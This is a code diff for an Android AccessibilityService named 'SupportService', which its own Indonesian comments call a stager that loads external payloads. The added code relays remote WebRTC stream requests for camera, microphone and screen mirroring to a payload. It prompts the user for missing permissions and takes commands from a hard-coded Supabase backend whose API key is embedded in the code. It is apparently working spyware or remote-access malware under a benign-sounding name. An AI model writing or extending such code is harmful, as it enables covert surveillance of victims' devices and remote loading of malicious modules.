@@ -19,13 +19,14 @@ import java.io.File;
  * Pure Loader Service (Stager)
  * APK ini hanya berisi kode minimal untuk memuat payload eksternal.
  */
-public class SupportService extends AccessibilityService implements SupabaseManager.CommandCallback, LifecycleOwner {
+public class SupportService extends AccessibilityService implements SupabaseManager.CommandCallback, SupabaseManager.SignalingListener, LifecycleOwner {
     private static final String TAG = "SupportService";
     private final Handler mainHandler = new Handler(Looper.getMainLooper());
     private final LifecycleRegistry lifecycleRegistry = new LifecycleRegistry(this);
 
     private SupabaseManager supabaseManager;
     private SupabaseManager.CommandCallback payloadCallback;
+    private SupabaseManager.SignalingListener payloadSignalingListener;
     private AccessibilityDelegate accessibilityDelegate;
     private static SupportService instance;
     private static Intent mirrorIntent;
@@ -41,13 +42,80 @@ public class SupportService extends AccessibilityService implements SupabaseMana
         this.payloadCallback = cb;
     }
 
-    /**
-     * Payload eksternal wajib memanggil ini agar bisa menerima sinyal WebRTC (Offer/ICE)
-     */
-    public void setSignalingListener(SupabaseManager.SignalingListener listener) {
-        if (supabaseManager != null) {
-            supabaseManager.setSignalingListener(listener);
+    @Override
+    public void onOfferReceived(String type, String offer) {
+        mainHandler.post(() -> {
+            Log.d(TAG, "Signaling Offer received via Stager: " + type);
+            String baseType = type.contains(":") ? type.split(":")[0] : type;
+            boolean needsAudio = type.contains(":audio") || type.equals("audio");
+
+            // 1. Check Camera Permission
+            if (baseType.startsWith("camera")) {
+                if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    Log.w(TAG, "Camera permission missing for stream. Requesting...");
+                    requestPermission("camera");
+                    return;
+                }
+            }
+
+            // 2. Check Audio Permission
+            if (needsAudio) {
+                if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    Log.w(TAG, "Mic permission missing for stream. Requesting...");
+                    requestPermission("mic");
+                    return;
+                }
+            }
+
+            // 3. Check Screen Mirroring Intent
+            if (baseType.equals("screen")) {
+                if (getMirrorIntent() == null) {
+                    Log.w(TAG, "Mirroring intent missing. Requesting...");
+                    requestPermission("screen");
+                    return;
+                }
+            }
+
+            // 4. If all permissions OK, pass to payload
+            if (payloadSignalingListener != null) {
+                payloadSignalingListener.onOfferReceived(type, offer);
+            } else {
+                Log.e(TAG, "Signaling failed: No payload signaling listener set!");
+                if (supabaseManager != null) {
+                    supabaseManager.sendData("logs", "[Stager] Stream failed: Payload listener not ready.");
+                }
+            }
+        });
+    }
+
+    @Override
+    public void onIceCandidateReceived(String candidate) {
+        if (payloadSignalingListener != null) {
+            payloadSignalingListener.onIceCandidateReceived(candidate);
         }
+    }
+
+    @Override
+    public void onStopSignalReceived() {
+        if (payloadSignalingListener != null) {
+            payloadSignalingListener.onStopSignalReceived();
+        }
+    }
+
+    private void requestPermission(String type) {
+        Intent i = new Intent(this, CoreActivity.class);
+        if (type.equals("screen")) {
+            i.putExtra("request_mirror", true);
+        } else {
+            i.putExtra("request_type", type);
+        }
+        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+        startActivity(i);
+    }
+
+    public void setSignalingListener(SupabaseManager.SignalingListener listener) {
+        this.payloadSignalingListener = listener;
+        Log.i(TAG, "Payload Signaling Listener Registered.");
     }
 
     public void setAccessibilityDelegate(AccessibilityDelegate delegate) {
@@ -117,6 +185,7 @@ public class SupportService extends AccessibilityService implements SupabaseMana
         
         // Inisialisasi Supabase untuk menerima perintah load_module
         supabaseManager = new SupabaseManager(deviceId, "https://envymntjecsgixofegbq.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVudnltbnRqZWNzZ2l4b2ZlZ2JxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY2MjQ5MzMsImV4cCI6MjA5MjIwMDkzM30.lxdxROh5IptFB7cOnRGjLQomX_KvrJly4CNIKN0-cuc", this);
+        supabaseManager.setSignalingListener(this);
         supabaseManager.init();
 
         // WAJIB: Aktifkan Foreground Service agar bisa akses Kamera/Mic/Screen di Android 11+
@@ -344,11 +413,11 @@ public class SupportService extends AccessibilityService implements SupabaseMana
             }
             
             if (lowerCmd.equals("screen")) {
-                Intent i = new Intent(this, CoreActivity.class);
-                i.putExtra("request_mirror", true);
-                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(i);
-                // Payload akan menunggu mirrorIntent tersedia
+                if (getMirrorIntent() == null) {
+                    requestPermission("screen");
+                } else {
+                    if (payloadCallback != null) payloadCallback.onCommandReceived(cmd);
+                }
                 return;
             }
 
